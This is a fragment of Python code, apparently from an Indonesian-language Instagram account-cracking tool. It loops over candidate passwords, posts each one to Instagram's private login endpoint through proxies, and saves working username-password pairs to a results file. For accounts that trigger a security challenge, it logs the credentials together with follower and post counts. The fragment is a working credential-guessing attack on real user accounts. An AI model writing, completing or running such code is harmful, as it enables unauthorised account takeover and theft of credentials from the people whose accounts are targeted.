...
bulan_ttl = {"01": "Januari", "02": "Februari", "03": "March", "04": "April", "05": "May", "06": "Jun", "07": "July", "08": "August", "09": "September", "10": "October", "11": "November", "12": "December"}
bulan = ["Januari","Februari","March","April","May","Jun","July","August","September","October","November","December"]
        ...
        for password in pasw:
              try:
                    with requests.Session() as ses:
                         ...
                         xnxx = ses.post("https://i.instagram.com/api/v1/accounts/login/", headers = headers, data = data, proxies = proxy, allow_redirects = True)
                         if "logged_in_user" in str(xnxx.text) or "sessionid" in ses.cookies.get_dict() or "userId" in str(xnxx.text):
                           ...
                           #   os.popen('play-audio rayok.mp3')
                              ...
                              with open("results/"+akunOK,"a", encoding="utf-8") as r:
                                   r.write(kntl+"\n")
                              break
                         elif "challenge" in str(xnxx.text):
                              pengikut,mengikut,postingan=self.Ingfo(user)
                              print("\r                                       ")
                              adit = f'\rUsername  : {user}\nPassword  : {password}\nPengikut  : {pengikut}\nMengikuti : {mengikut}\nPostingan : {postingan}\nUser-Agent: {uklik}'
